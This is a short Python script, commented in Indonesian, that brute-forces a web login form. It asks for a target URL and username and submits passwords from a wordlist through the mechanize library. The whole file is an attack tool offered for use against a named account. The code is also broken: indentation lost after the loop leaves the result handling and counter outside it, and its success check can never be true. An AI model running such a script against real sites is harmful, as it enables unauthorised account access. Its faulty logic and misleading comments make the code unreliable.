# Mengimpor library
import mechanize

# Menginisialisasikan variabel "url" dengan hasil berupa masukkan bertipe data string
url = str(input("Enter the full of url >> "))

# Menginisialisasikan variabel "username" dengan hasil berupa masukkan bertipe data string
username = str(input("Enter username of target >> "))

#  Menginisialisasikan variabel "numberofAttack" dengan hasil bertipe data integer yaitu 1
numberofAttack = 1

# Method untuk membuka berkas yang berisi daftar password berekstensi .txt
with open('wordlist.txt') as v:
    # Perulangan 'for' untuk melakukan proses percobaan interaksi
    for lines in v:
        br = mechanize.Browser() # Menginisialisasikan variabel "br" dengan hasil berupa method untuk melakukan interaksi dengan browser
        br.open(url) # Method untuk membuka alamat web
        br.select_form(nr = 0) # Method untuk melakukan interaksi dengan form
        br["username"] = username # Nama form "username" dengan hasil atau diisi berupa username
        br["password"] = lines # Nama form "password" dengan hasil atau diisi berupa password
        rs = br.submit() # Menginisialisasikan variabel "rs" dengan hasil berupa method untuk melakukan submit terhadap form yang telah diisi
        ctnt = rs.read() # Menginisialisasikan variabel "ctnt" dengan hasil berupa method untuk membaca isi konten
output = open('response/' + str(numberofAttack) + '.txt', 'w') # Menginisialisasikan variabel "output" dengan hasil berupa method untuk membuat file baru berekstensi .txt
if ctnt == True: # Pengkondisian if jika ada isi konten setelah berhasil submit
    print(lines) # Mencetak password
    print(ctnt) # Mencetak isi konten
output.close() # Mengakhiri proses membuat file baru
print(numberofAttack) # Mencetak variabel "numberofAttack"
numberofAttack += 1 # Menjumlahkan nilai variabel "numberofAttack" dengan angka 1
